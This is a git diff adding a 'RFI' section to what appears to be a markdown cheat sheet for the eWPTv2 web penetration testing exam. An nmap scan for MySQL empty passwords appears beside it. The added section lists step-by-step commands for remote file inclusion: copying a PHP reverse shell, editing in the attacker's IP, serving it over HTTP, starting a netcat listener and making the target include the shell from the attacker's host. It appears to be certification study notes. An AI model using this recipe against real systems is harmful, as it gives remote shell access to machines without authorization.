@@ -63,6 +63,23 @@
 ## Nmap Scan for the eWPTv2
 - __```sudo nmap -sS -sV --script mysql-empty-password -p 3306 120.0.0.1```__
 
+## RFI
+
+- __```ls -la /usr/share/webshells/php/```__
+- __```cp /usr/share/webshells/php/php-reverse-shell.php```__
+- > __change the ip to your ip__
+
+- __```python -m SimpleHTTPServer 80```__
+- __```nc -nvlp 1234```__
+
+
+- __In target `<url>/index.php?page=http://<your_ip>/shell.php`__
+
+
+
+
+
+
 ## Arbitrary File Upload 
 #### 1
 ```php
